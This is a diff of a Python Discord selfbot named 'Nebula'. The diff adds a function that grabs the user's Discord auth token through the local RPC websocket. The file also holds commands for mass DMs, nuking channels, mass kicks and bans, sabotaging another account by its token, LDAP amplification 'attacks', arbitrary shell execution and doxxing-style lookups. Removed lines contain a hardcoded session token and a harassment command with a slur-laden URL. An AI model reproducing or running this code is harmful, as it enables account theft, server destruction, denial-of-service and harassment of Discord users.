@@ -22,8 +22,16 @@ client = commands.Bot(
 )
 client.remove_command('help') 
 
+async def getToken():
+	async with aiohttp.ClientSession() as session:
+		async with session.ws_connect('ws://127.0.0.1:6463/?v=1&encoding=json', headers={'origin': 'https://discord.com'}, max_msg_size=0) as discordWS:
+			await discordWS.send_str(json.dumps({'cmd': 'SUBSCRIBE', 'args': {}, 'evt': 'OVERLAY', 'nonce': 1}))
+			await discordWS.send_str(json.dumps({'cmd': 'OVERLAY', 'args': {'type': 'CONNECT', 'pid': 0}, 'nonce': 1}))
+			async for message in discordWS:
+				try: return message.json()['data']['payloads'][0]['token']
+				except: continue
 
-                
+token = asyncio.get_event_loop().run_until_complete(getToken())              
 Ousername = getpass.getuser()
 hostname = socket.gethostname()
 ip_address = socket.gethostbyname(hostname)
@@ -36,7 +44,8 @@ with open('config.json') as f:
 title = config.get('title')
 footer = config.get('footer')
 author = config.get('author')
-token = config.get('token')
+del_sec = config.get('delete_sec')
+delete_after=del_sec = delete_after=del_sec
 t = time.localtime()
 current_time = time.strftime("%H:%M:%S", t)
 start_time = datetime.datetime.utcnow()
@@ -72,30 +81,32 @@ def banner():
     cpu_per = round(psutil.cpu_percent(),1)
     mem_per = round(psutil.virtual_memory().percent,1)
     Servers = len(client.guilds)    
-    ctypes.windll.kernel32.SetConsoleTitleW(f'Nebula - Selfbot | Version 2.2 | Connected as: {nebula.user.name}#{nebula.user.discriminator}')
+    ctypes.windll.kernel32.SetConsoleTitleW(f'Nebula - Selfbot | Version 2.2 | Connected as: {client.user.name}#{client.user.discriminator}')
     os.system('cls')
     Servers = len(client.guilds)
     friends = len(client.user.friends)
     r = f'{Fore.MAGENTA}'
     w = f'{Fore.WHITE}'
     print(f'''
+{w}         *   *    .  *      .        .  *   .          *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
 {w}   *  .  . *       *    .        .        .   *    ..  *    *            .      *   *         *   *    .  *      .        .  *   .
 {w} .    *        .        .      .        .            *         *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
 {w}    *.   *          .     *      *        *    .     *.   *          .     *      *        *    .
 {w}         *   *    .  *      .        .  *   .          *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
 {w}   .        ..    *    .      *  .  ..  *    .        ..    *    .      *  .  ..  *         *   *    .  *      .        .  *   .
+{w}         *   *    .  *      .        .  *   .          *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
 
-                                    {r}Nebula Loaded{w}!                              {r}Version 2.2
-                                  {w}═════════════════════════════════════════════════════════════
-     
+                               {r}Nebula Loaded{w}!                             {r}  Version 2.2
+                             {w}═════════════════════════════════════════════════════════════
+  
                                         {r}╔╗╔╔═╗╔╗ ╦ ╦╦  ╔═╗  ╔═╗╔═╗╦  ╔═╗╔╗ ╔═╗╔╦╗
                                         {r}║║║║╣ ╠╩╗║ ║║  ╠═╣  ╚═╗║╣ ║  ╠╣ ╠╩╗║ ║ ║ 
                                         {r}╝╚╝╚═╝╚═╝╚═╝╩═╝╩ ╩  ╚═╝╚═╝╩═╝╚  ╚═╝╚═╝ ╩
-     
-                                                      {r}User:    {w}[{r}{client.user.name}{w}#{r}{client.user.discriminator}{w}] 
-                                                      {r}Guilds:  {w}[{r}{Servers}{w}]
-                                                      {r}Friends: {w}[{r}{friends}{w}]
-                                  {w}═════════════════════════════════════════════════════════════
+  
+                                                 {r}User:    {w}[{r}{client.user.name}{w}#{r}{client.user.discriminator}{w}] 
+                                                 {r}Guilds:  {w}[{r}{Servers}{w}]
+                                                 {r}Friends: {w}[{r}{friends}{w}]
+                             {w}═════════════════════════════════════════════════════════════
                                                    
 '''+Fore.RESET)
                                                    
@@ -112,11 +123,13 @@ def loading():
     r = f'{Fore.MAGENTA}'
     w = f'{Fore.WHITE}'
     print(f'''
+{w}         *   *    .  *      .        .  *   .          *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
 {w}   *  .  . *       *    .        .        .   *    ..  *    *            .      *   *         *   *    .  *      .        .  *   .
 {w} .    *        .        .      .        .            *         *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
 {w}    *.   *          .     *      *        *    .     *.   *          .     *      *        *    .
 {w}         *   *    .  *      .        .  *   .          *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
-{w}   .        ..    *    .      *  .  ..  *    .        ..    *    .      *  .  ..  *         *   *    .  *      .        .  *   .                            
+{w}   .        ..    *    .      *  .  ..  *    .        ..    *    .      *  .  ..  *         *   *    .  *      .        .  *   .
+{w}         *   *    .  *      .        .  *   .          *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .                           
                                  
                                  
                                  
@@ -124,7 +137,6 @@ def loading():
                                                     {Fore.WHITE}[{Fore.MAGENTA}Final Edtion{Fore.WHITE}]                            
     
     ''')
-    time.sleep(0.6)
 
 mem = psutil.virtual_memory()
 cpu_per = round(psutil.cpu_percent(),1)
@@ -138,7 +150,7 @@ async def webhook(ctx, webhook):
         if statuscode1 ==404:	
             embed=discord.Embed(title="**Invalid Webhook!**",color=0xbf00ff, timestamp=ctx.message.created_at)	
             embed.set_footer(text=f'{footer} ')	
-            await ctx.send(embed=embed,delete_after=10)	
+            await ctx.send(embed=embed,delete_after=del_sec)	
 
         elif statuscode1 ==200:	
             info = requests.get(f"{webhook}")	
@@ -152,7 +164,7 @@ async def webhook(ctx, webhook):
             if statuscode ==200:	
                 embed=discord.Embed(title="**Error!**",color=0xbf00ff, timestamp=ctx.message.created_at)	
                 embed.set_footer(text=f'{footer} ')	
-                await ctx.send(embed=embed,delete_after=10)	
+                await ctx.send(embed=embed,delete_after=del_sec)	
 
             else:	
                 embed=discord.Embed(title="__**Deleted!**__",color=0xbf00ff, timestamp=ctx.message.created_at)	
@@ -161,7 +173,7 @@ async def webhook(ctx, webhook):
                 embed.add_field(name="**Server ID**", value=f"{WebGuildID}", inline=False)	
                 embed.set_image(url=f"https://cdn.discordapp.com/avatars/{WebID}/{Avatar}")                          	
                 embed.set_footer(text=f'{footer} ')	
-                await ctx.send(embed=embed,delete_after=10)	
+                await ctx.send(embed=embed,delete_after=del_sec)	
 
     except:	
         print(f"{Style.BRIGHT}{Fore.WHITE}[{Style.BRIGHT}{Fore.MAGENTA}!]{Fore.WHITE} Invalid Webhook")     
@@ -180,11 +192,13 @@ async def on_connect():
     r = f'{Fore.MAGENTA}'
     w = f'{Fore.WHITE}'
     print(f'''
+{w}         *   *    .  *      .        .  *   .          *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
 {w}   *  .  . *       *    .        .        .   *    ..  *    *            .      *   *         *   *    .  *      .        .  *   .
 {w} .    *        .        .      .        .            *         *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
 {w}    *.   *          .     *      *        *    .     *.   *          .     *      *        *    .
 {w}         *   *    .  *      .        .  *   .          *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
 {w}   .        ..    *    .      *  .  ..  *    .        ..    *    .      *  .  ..  *         *   *    .  *      .        .  *   .
+{w}         *   *    .  *      .        .  *   .          *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
 
                                {r}Nebula Loaded{w}!                             {r}  Version 2.2
                              {w}═════════════════════════════════════════════════════════════
@@ -204,14 +218,12 @@ async def on_connect():
 async def on_message_edit(before, after):
     await client.process_commands(after)
 
-
-
 @client.command()
 async def system(ctx):
     await ctx.message.delete()
     embed=discord.Embed(title=f"*System Resources*", description=f"```Memory - {mem_per}%\n\nCPU - {cpu_per}%\n```", color=0xbf00ff, timestamp=ctx.message.created_at)
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 @client.command()
 async def help(ctx):
@@ -220,7 +232,7 @@ async def help(ctx):
     embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 @client.command()
 async def status(ctx):
@@ -229,7 +241,7 @@ async def status(ctx):
     embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 def google(search):
@@ -257,7 +269,7 @@ async def raid(ctx):
     embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
  
 
 @client.command()
@@ -267,7 +279,7 @@ async def exploits(ctx):
     embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 @client.command()
 async def project(ctx):
@@ -275,16 +287,15 @@ async def project(ctx):
     embed=discord.Embed(title=f" **Project Link** ", description=f"https://github.com/fansigns/nebula-selfbot/", color=0xbf00ff, timestamp=ctx.message.created_at)
     embed.set_thumbnail(url='https://images-ext-1.discordapp.net/external/O9v-PlVnlyl0qpUzQxMUAEItJ4Zb92A9C1trxLH676U/%3Fs%3D400%26v%3D4/https/avatars0.githubusercontent.com/u/74613350')
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
     
-
 @client.command()
 async def dmall(ctx, *, dmall):
     await ctx.message.delete()
     embed=discord.Embed(title=f" **Attempting to DM {ctx.guild.member_count} users** ", description=f"With the message of **{dmall}**", color=0xbf00ff, timestamp=ctx.message.created_at)
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
     for user in ctx.guild.members:
         try:
                 await user.send(dmall)
@@ -305,7 +316,7 @@ async def nuke(ctx):
     await new_channel.edit(position=channel_position, sync_permissions=True)
     embed=discord.Embed(title=f" **Nuked!** ", description=f"```This channel was nuked by Nebula Selfbot!```", color=0xbf00ff, timestamp=ctx.message.created_at)
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10,new_channel=new_channel)
+    await ctx.send(embed=embed,delete_after=del_sec,new_channel=new_channel)
 
 @client.command()
 @commands.has_permissions(ban_members=True)
@@ -315,7 +326,7 @@ async def test(ctx):
     embed.set_thumbnail(url='https://giphygifs.s3.amazonaws.com/media/HhTXt43pk1I1W/200.gif')
     await ctx.channel.delete(reason="nuke")
     channel = await ctx.channel.clone(reason="nuke")
-    await channel.send(embed=embed, delete_after=10)
+    await channel.send(embed=embed, delete_after=del_sec)
 
 @client.command()
 async def general(ctx):
@@ -324,7 +335,7 @@ async def general(ctx):
     embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 @client.command()
 async def unverify(ctx, _token): 
@@ -344,7 +355,7 @@ async def poll(ctx, *, question: str):
     await ctx.message.delete()
     embed=discord.Embed(title=f" **Poll!** ", description=f"```{question}```", color=0xbf00ff, timestamp=ctx.message.created_at)
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
     try:
         await ctx.message.delete()
@@ -370,7 +381,7 @@ async def tools(ctx):
     embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -387,19 +398,7 @@ async def lookup(ctx, *, ip: str):
     embed.add_field(name="Language", value=f"{ip_info['languages']}", inline=False)
     embed.add_field(name="Currency", value=f"{ip_info['currency']}", inline=False)
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
-
-@client.command()
-async def blockbypass(ctx, message, client_id):
-    await ctx.message.delete()
-    token = getToken
-    client_id = client
-    headers = {'Authorization': token}
-    res = requests.post('https://discordapp.com/api/v6/users/@me/channels', headers=headers, json={'recipient_id': client_id})
-    return res.json().get('id')
-    channel_id = _get_channel_id(client_id)
-    return requests.post(f'https://discordapp.com/api/v6/channels/{channel_id}/messages', headers=headers, json={'content': message})
-
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -425,7 +424,7 @@ async def terminal(ctx, *, text):
     output = subprocess.getoutput(f"{text}")
     embed=discord.Embed(title=f" **Terminal** ", description=f"```{output}```", color=0xbf00ff, timestamp=ctx.message.created_at)
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 @client.command()
 async def cloudssp(ctx, site):
@@ -436,7 +435,7 @@ async def cloudssp(ctx, site):
         embed=discord.Embed(title=f" **Seems like this site is not vulnerable** ", description=f"", color=0xbf00ff, timestamp=ctx.message.created_at)
         
         embed.set_footer(text=f'{footer} ')
-        await ctx.send(embed=embed,delete_after=10)
+        await ctx.send(embed=embed,delete_after=del_sec)
 
     else:
         arg = site
@@ -446,36 +445,13 @@ async def cloudssp(ctx, site):
         embed=discord.Embed(title=f" **CloudSSP** ", description=f"URL: {arg}\n Protected IP: **{ip}**\n Protected Port: **{port}**\n **Backend**:\n```{output}\n```", color=0xbf00ff, timestamp=ctx.message.created_at)
         
         embed.set_footer(text=f'{footer} ')
-        await ctx.send(embed=embed,delete_after=10)
+        await ctx.send(embed=embed,delete_after=del_sec)
 
         
 @client.command(pass_context=True)
 async def chnick(ctx, member: discord.Member, *, nick):
     await ctx.message.delete()
     await member.edit(nick=nick)
-#def cloudssp():
-   # @client.command()
-    #async def cfbypass(ctx, site):
-       # await ctx.message.delete()
-        #embed=discord.Embed(title=f" **Check Console!** ", description=f"", color=0xbf00ff, timestamp=ctx.message.created_at)
-        #await ctx.send(embed=embed,delete_after=5)
-
-    
-   # url = sites = site
-   # x = requests.get(url+'/mailman/listinfo/mailman')
-    
-
-   # if x.status_code == 404:
-    #          print(f'{Fore.MAGENTA}Seems like this site is not vulnerable.')
-  #            
-   # else:
-  #        print(f"{Fore.WHITE}Looks like we found something!")
-       #   print("")
-  #        print(f"{Fore.YELLOW}IP/Domain links found:{Fore.WHITE}")
-   #       print("")
-
-#          os.system("curl "+sites+"/mailman/listinfo/mailman -s | findstr POST")
-
      
 @client.command()
 async def reload(ctx):
@@ -484,16 +460,18 @@ async def reload(ctx):
     embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
     restart_program()
+
+
 @client.command()
 async def md5(ctx, *, message):
     await ctx.message.delete()
     result = hashlib.md5(f"{message}".encode("utf-8")).hexdigest()
-    embed=discord.Embed(title=f" MD5 Encode For {message} ", description=f"{result}", color=0xbf00ff, timestamp=ctx.message.created_at)
+    embed=discord.Embed(title=f" Message Encoded! ", description=f"{result}", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -504,7 +482,7 @@ async def sha256(ctx, *, message):
     embed=discord.Embed(title=f" SHA256 Encode For {message} ", description=f"{result}", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -526,7 +504,7 @@ async def prefix(ctx, prefix):
     embed=discord.Embed(title=f" **Prefix changed to {prefix}** ", description=f"", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -582,7 +560,7 @@ async def serverinfo(ctx):
     embed.set_thumbnail(url=server.icon_url)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 @client.command()
 async def ping(ctx, *, ip: str):
@@ -593,7 +571,7 @@ async def ping(ctx, *, ip: str):
     embed.add_field(name="Output", value='```%s```' % "\n".join(str(x) for x in result), inline=False)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -603,19 +581,7 @@ async def av(ctx, *, user: discord.Member=None):
     embed.set_image(url=user.avatar_url)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
-
-@client.command()
-async def vi(ctx):
-    await ctx.message.delete()
-    #http://femboy.host/uploads/5363db86-1ece-475a-b86f-c0b31373108e/LI1G2Ak6.png
-    #https://images-ext-2.discordapp.net/external/ouZK4T1IjzO1MF4ZnMN1mfBd85Z1GKmoCzW8hfFnS3E/http/i-hate.niggers.lol/uploads/0f18d1ce-6692-4104-bbb0-d6e96b56b92e/0vNw3hnM.png
-    embed=discord.Embed(title="**vi**",description="vi condones child porn and is mad because her server got banned for a legitimate reason!", color=0xbf00ff, timestamp=ctx.message.created_at)
-    embed.set_image(url='https://cdn.discordapp.com/attachments/784623962038468608/786008132253646848/image0.png')
-    embed.set_thumbnail(url='https://cdn.discordapp.com/avatars/715581783260921976/a_2a2c88ccb3e84563d88b4f6ed4fb1b2c.gif?size=1024')
-    
-    embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -626,7 +592,7 @@ async def sav(ctx):
     embed.set_image(url=server.icon_url)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 @client.command()
 async def sba(ctx):
@@ -636,7 +602,7 @@ async def sba(ctx):
     embed.set_image(url=server.banner_url)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 @client.command()
 async def game(ctx, *, message):
@@ -653,7 +619,7 @@ async def phonelookup(ctx, phone):
     embed=discord.Embed(title=f" **Info On {phone}** ", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 def friendsprint(*objects, sep = ' ', end = '\n ', file = sys.stdout):
@@ -671,7 +637,7 @@ async def skypelookup(ctx, username):
     embed=discord.Embed(title=f" **Skype Lookup for {username}** ", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 @client.command()
 async def backup(ctx):
@@ -687,7 +653,7 @@ async def upordown(ctx, site):
     embed=discord.Embed(title=f" **Up or Down?** ", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -711,36 +677,8 @@ async def ldap(ctx, target, port, duration):
     embed=discord.Embed(title=f" **Attack** ", description=f"{response_json}", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
-
-@client.command()
-async def pxl(ctx):
-    await ctx.message.delete()
-    url = "https://api.pxl.blue/auth/login"
-
-    payload = { "password": "joe", 
-                "username": "charge",
-                "rememberMe": "true"
-           }
-
-    header = {  "Content-type": "application/json",
-                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36",
-                
-    }
-
-    cookies = {
-                    "__cfduid": "da2ea55e9751acdac94c8732904ec41ec1606870526",
-                    "__cf_bm": "c1b7deacf85d8abbb45840ab2365579f0b37199c-1606870526-1800-AfCn8sZBBlp5wPvDDI23np10oZaQQb5J1mVV9o/ivsWF",
-                    "session": "Bearer N3trBDDU4ad49O3Pd9S4sdddlqB8LReMw79AQ/kfbFTHH/FJ0kHi8rZggNteHqrBSq/Q72gx6NL+tpe76NwwFLbDdUu/e5zAMwFkPnexzecBfigAvzNkYS0eArd22IPH"
-
-    }
-
-    response_decoded_json = requests.post(url, data=payload, headers=header)
-    response_json = response_decoded_json.json()
-    embed=discord.Embed(title=f" **PXL POST** ", description=f"{response_json}", color=0xbf00ff, timestamp=ctx.message.created_at)
-    
-    await ctx.send(embed=embed)
 
 @client.command()
 async def instagram(ctx, username):
@@ -751,7 +689,7 @@ async def instagram(ctx, username):
     em.add_field(name="Folling :", value=str(data[f"edge_follow":{"count":()}]), inline=True)
     em.add_field(name="Followers :", value=str(data[f"edge_followed_by":{"count":()}]), inline=True)
     em.set_thumbnail(url=str(data[f'profile_pic_url':{"count":()}]))
-    await ctx.send(embed=em, delete_after=10)
+    await ctx.send(embed=em, delete_after=del_sec)
 
 
 @client.command()
@@ -762,7 +700,7 @@ async def portscan(ctx, ipadd: str):
     embed.add_field(name="Open Ports: ", value=f"{r}", inline=False)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -772,7 +710,7 @@ async def spanish(ctx,*, text):
     embed = discord.Embed(title="**Spanish Text**", description=f"**{r}**", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -782,7 +720,7 @@ async def russian(ctx,*, text):
     embed = discord.Embed(title="**Russian Text**", description=f"**{r}**", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -792,7 +730,7 @@ async def subscan(ctx, text):
     embed = discord.Embed(title=f"**Subdomain Scan for {text}**", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -802,7 +740,7 @@ async def headers(ctx, text):
     embed = discord.Embed(title=f"**Headers for {text}**", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 # https://api.c99.nl/getheaders?key=<key>&host=example.com
 @client.command()
@@ -812,7 +750,7 @@ async def torcheck(ctx, text):
     embed = discord.Embed(title=f"**Tor Check for {text}**", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -822,7 +760,7 @@ async def firewall(ctx, text):
     embed = discord.Embed(title=f"**Firewall Scan for {text}**", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -832,7 +770,7 @@ async def dictionary(ctx, text):
     embed = discord.Embed(title=f"**Word lookup for {text}**", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -842,7 +780,7 @@ async def yt2mp3(ctx, text):
     embed = discord.Embed(title=f"**YT 2 MP3**", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -852,7 +790,7 @@ async def passgen(ctx, text):
     embed = discord.Embed(title=f"**Password Generated!**", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -862,10 +800,10 @@ async def webss(ctx, URL):
     embed=discord.Embed(title=f" **{URL} Screenshot** ", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
-# -- API COMMANDS -- #
+# -- API COMMANDS END -- #
 
 @client.command()
 async def illegal(ctx): 
@@ -899,15 +837,7 @@ async def illegal(ctx):
         await ctx.guild.create_text_channel(name='Rape')
     for _i in range(250):
         await ctx.guild.create_role(name='Rape', color='0xbf00ff')
-
-@client.command()
-async def massban(ctx): 
-    await ctx.message.delete()
-    for user in list(ctx.guild.members):
-        try:
-            await user.ban()
-        except:
-            pass    
+ 
 
 @client.command()
 async def masskick(ctx): 
@@ -991,7 +921,7 @@ async def tokeninfo(ctx, _token):
     except KeyError:
         embed=discord.Embed(title="Invalid Token!", color=0xbf00ff, timestamp=ctx.message.created_at)
         embed.set_footer(text=f'{footer} ')
-        await ctx.send(embed=embed,delete_after=10)
+        await ctx.send(embed=embed,delete_after=del_sec)
     em = discord.Embed(
         description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})", color=0xbf00ff, timestamp=ctx.message.created_at)
     fields = [
@@ -1025,7 +955,7 @@ async def tokenfuck(ctx, _token):
     embed.set_thumbnail(url="https://imgur.com/LIyGeCR")
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
     
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
@@ -1079,6 +1009,7 @@ async def tokenfuck(ctx, _token):
             else:
                 break    
 
+
 @client.command(aliases=["udox"])
 async def userinfo(ctx, member: discord.Member = None):
     await ctx.message.delete()
@@ -1099,7 +1030,7 @@ async def userinfo(ctx, member: discord.Member = None):
     embed.add_field(name="Highest Role:", value=member.top_role.mention)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command(name='unban')
@@ -1109,7 +1040,7 @@ async def _unban(ctx, id: int):
     embed=discord.Embed(title=f"Unbanned {id}!", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 @client.command()
 async def embed(ctx, title: str, *, description):
@@ -1117,7 +1048,7 @@ async def embed(ctx, title: str, *, description):
     embed=discord.Embed(title=f"{title}",description=f"{description}", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -1127,7 +1058,7 @@ async def ban(ctx, member : discord.Member, *, reason = None):
     embed=discord.Embed(title=f"Banned {member}", color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 @client.command()
 async def tweet(ctx, username: str, *, message: str):
@@ -1156,7 +1087,7 @@ async def covid(ctx):
     embed.add_field(name="Recovered", value=f"**{res[totalr]}**", inline=True)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -1207,7 +1138,7 @@ async def host2ip(ctx, *, host: str):
     embed.add_field(name="Host", value=f"{host}", inline=True)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 
 @client.command()
@@ -1220,7 +1151,7 @@ async def b64decode(ctx, message):
     embed=discord.Embed(title=f"Decode for {message}!",description=f"{decodee}",color=0xbf00ff, timestamp=ctx.message.created_at)
     
     embed.set_footer(text=f'{footer} ')
-    await ctx.send(embed=embed,delete_after=10)
+    await ctx.send(embed=embed,delete_after=del_sec)
 
 @client.command()
 async def b64encode(ctx, *, message):
@@ -1232,7 +1163,7 @@ async def b64encode(ctx, *, message):
